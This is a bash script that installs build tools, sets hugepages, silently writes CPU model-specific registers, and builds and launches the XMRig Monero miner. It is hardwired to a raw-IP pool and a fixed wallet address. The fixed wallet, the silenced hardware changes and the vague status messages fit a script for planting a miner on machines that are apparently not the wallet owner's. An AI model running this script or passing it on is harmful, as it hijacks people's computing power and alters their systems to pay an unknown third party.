#!/bin/bash

apt update 
WALLET="44Dzqvm7mx3LTETpwC5xRDQQs9Mn3Y1ZSV3YkJdQSDUaTo7xXMirqtnUu3ZtoYky2CE4gMJDKJPivUSRvNAvqBawJ8agMuU"
POOL="153.92.5.32:2222"   
WORKER="${1:-FastRig}"  

REQUIRED_PACKAGES=("cmake" "git" "build-essential" "cmake" "automake" "libtool" "autoconf" "libhwloc-dev" "libuv1-dev" "libssl-dev" "msr-tools" "curl")

install_dependencies() {
    for package in "${REQUIRED_PACKAGES[@]}"; do
        dpkg -l | grep -qw $package || apt install -y $package
    done
}

echo "[+] Checking and installing required dependencies..."
install_dependencies

echo "[+] Enabling hugepages..."
sysctl -w vm.nr_hugepages=128

echo "[+] Writing hugepages config..."
echo 'vm.nr_hugepages=128' >> /etc/sysctl.conf

echo "[+] Setting ..."
modprobe msr 2>/dev/null
wrmsr -a 0x1a4 0xf 2>/dev/null

echo "[+] Cloning ..."
git clone https://github.com/xmrig/xmrig.git
cd xmrig
mkdir build && cd build

echo "[+] Building ..."
cmake ..
make -j$(nproc)

echo "[+] starting in 2 seconds..."
sleep 2

echo "[+] Starting  pool..."
./xmrig -o $POOL -u $WALLET -p $WORKER -k --coin monero
